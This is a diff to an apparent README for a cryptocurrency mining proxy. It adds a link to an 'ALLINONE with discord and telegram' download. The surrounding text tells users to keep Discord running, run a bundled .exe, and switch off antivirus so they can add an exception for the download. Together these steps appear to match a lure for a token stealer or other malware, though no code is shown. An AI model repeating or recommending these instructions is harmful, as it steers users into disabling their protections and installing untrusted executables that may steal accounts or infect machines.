@@ -33,3 +33,5 @@ tested wth gminer/lolminer/trex
 
 please download latest bugs fixed , https://github.com/lolzminer123/proxyminer/releases/tag/minerproxy
 please make sure discord is running before launching and python 3.10 is installed if u want to run the python version which is included in the latest folder. howwver u can just run the .exe file instead , also python can be download on microsoft store just type python look for 3.10 but imsure any python will work just not the latest version 3.11 and install then launch proxy will start then enter required info, may trigger av if it does just turn of av download make acception then turn av back on happy mining
+
+heres another a ALLINONE with discord and telegram >> https://github.com/lolzminer123/proxyminerlargepill <<
